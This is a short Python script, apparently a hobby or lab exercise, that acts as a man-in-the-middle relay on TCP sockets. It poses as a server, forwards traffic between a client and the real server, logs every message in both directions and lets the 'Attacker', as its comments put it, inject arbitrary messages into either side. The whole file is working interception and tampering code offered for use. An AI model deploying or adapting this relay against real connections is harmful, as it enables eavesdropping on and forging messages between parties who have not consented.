import socket
from datetime import datetime
from threading import Thread

# Loading setting data to make it easyer
save = {}
path = "".join(x+"/" for x in __file__.split("/")[:-1])
active = True
with open(f"{path}/data.txt") as file:
    for x in file.readlines():
        x = x.strip().split(":",1)
        save[x[0]] = x[1].isdigit() and int(x[1]) or x[1]

#Sets up the fake server
mid_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
mid_server.bind((save["Add"],save["FP"]))
mid_server.listen(1)

# connects to the real server
mid_cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
mid_cli.connect((save["Add"],save["RP"]))

# waits to see if a client connects
cli, addr = mid_server.accept()
print(f"Client connected at {addr[0]}")

# take any message the real server sends, prints it and sends it to the client
def InterSer():
    global active,mid_cli,cli,save
    while active:
        data = mid_cli.recv(save["data"])
        if data:
            print(f"[{datetime.now()}][Server]: {data.decode()}")
            cli.send(data)

# takes any message the client sends, prints it and sends it to the real server
def InterCli():
    global active,mid_cli,cli,save
    while active:
        data = cli.recv(save["data"])
        if data:
            print(f"[{datetime.now()}][Client]: {data}")
            mid_cli.send(data)

Thread(target=InterSer).start()
Thread(target=InterCli).start()

# makes it so that the Attacker can send a message 
try:
    while True:
        while True:
            wh = input("Server or Client (S,C): ")
            if wh == "S" or wh == "C":
                break

        data = input("Message: ")
        if wh == "C":
            cli.send(data.encode())
        elif wh == "S":
            mid_cli.send(data.encode())
except:
    pass
active = False